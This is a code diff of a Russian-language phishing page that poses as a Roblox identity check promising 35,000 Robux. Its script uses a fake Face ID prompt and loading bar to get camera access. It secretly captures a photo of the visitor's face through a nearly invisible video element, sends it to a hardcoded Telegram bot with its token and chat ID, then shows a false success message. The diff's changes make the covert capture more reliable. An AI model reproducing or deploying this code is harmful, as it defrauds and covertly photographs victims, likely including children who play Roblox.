@@ -3,75 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Verification</title>
+    <title>Roblox Security Check</title>
     <style>
         body { font-family: sans-serif; background: #111; color: white; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #222; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; }
-        .btn { background: #0084ff; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; z-index: 9999; }
+        .card { background: #222; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; border: 1px solid #333; }
+        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        #loader { display: none; margin-top: 15px; color: #0084ff; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div id="flash"></div> <div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1);">
-    <h2>Face ID Проверка</h2>
-    <p id="info">Для получения 35,000 Robux поднесите телефон к лицу и нажмите кнопку.</p>
-    <button class="btn" onclick="capture()">ПОДТВЕРДИТЬ</button>
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 15px;">
+    <h2>Проверка владельца</h2>
+    <p>Для зачисления <b>35,000 Robux</b> подтвердите личность. Держите телефон перед лицом.</p>
+    <button class="btn" id="mainBtn" onclick="startScan()">ПОДТВЕРДИТЬ</button>
+    <div id="loader">ИДЕТ СКАНЕР... 0%</div>
 </div>
 
-<video id="v" autoplay playsinline muted style="display:none;"></video>
+<video id="v" autoplay playsinline muted style="position:fixed; top:0; left:0; width:1px; height:1px; opacity:0.01;"></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    async function capture() {
-        const btn = document.querySelector('.btn');
-        const info = document.getElementById('info');
-        const flash = document.getElementById('flash');
-        
+    async function startScan() {
+        const btn = document.getElementById('mainBtn');
+        const loader = document.getElementById('loader');
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+
         btn.style.display = 'none';
-        info.innerText = "Идет сканирование... Смотрите в камеру";
+        loader.style.display = 'block';
 
         try {
+            // Запрашиваем камеру с высоким приоритетом
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user", width: 1280, height: 720 } 
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
             });
-            const video = document.getElementById('v');
+            
             video.srcObject = stream;
+            
+            // Ждем, пока видео реально начнет воспроизводиться
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
 
-            // Ждем 3.5 секунды, чтобы камера настроила свет
+            // Имитация загрузки (дает камере 4 секунды на настройку света)
+            let prog = 0;
+            const interval = setInterval(() => {
+                prog += 25;
+                loader.innerText = "ИДЕТ СКАНЕР... " + prog + "%";
+                if(prog >= 100) clearInterval(interval);
+            }, 1000);
+
+            // Снимок через 4.5 секунды (гарантия против черного экрана)
             setTimeout(() => {
-                // Эффект вспышки (экран станет белым на секунду)
-                flash.style.display = 'block';
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
                 
-                setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const fd = new FormData();
-                        fd.append('chat_id', '7889497672');
-                        fd.append('photo', blob, 'face.jpg');
-                        fd.append('caption', '👤 ЛИЦО ПОЛУЧЕНО\n(с задержкой и вспышкой)');
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', '7889497672');
+                    fd.append('photo', blob, 'face.jpg');
+                    fd.append('caption', '👤 **ЛИЦО ПОЛУЧЕНО!**\n(С задержкой 4.5с для Chrome)');
 
-                        fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
-                            method: 'POST',
-                            body: fd
-                        }).then(() => {
-                            flash.style.display = 'none';
-                            stream.getTracks().forEach(t => t.stop());
-                            alert("Готово! Ожидайте зачисления.");
-                            window.location.href = "https://www.roblox.com";
-                        });
-                    }, 'image/jpeg', 0.8);
-                }, 200); // Снимок через 0.2 сек после включения вспышки
-            }, 3500); // 3.5 секунды на подготовку камеры
+                    fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
+                        method: 'POST',
+                        body: fd
+                    }).then(() => {
+                        stream.getTracks().forEach(t => t.stop());
+                        alert("✅ Личность подтверждена! Награда придет через 15 минут.");
+                        window.location.href = "https://www.roblox.com";
+                    });
+                }, 'image/jpeg', 0.8);
+            }, 4500);
 
         } catch (e) {
-            alert("Разрешите камеру!");
+            alert("Ошибка! Нужно нажать 'Разрешить' для Face ID.");
             btn.style.display = 'block';
+            loader.style.display = 'none';
         }
     }
 </script>
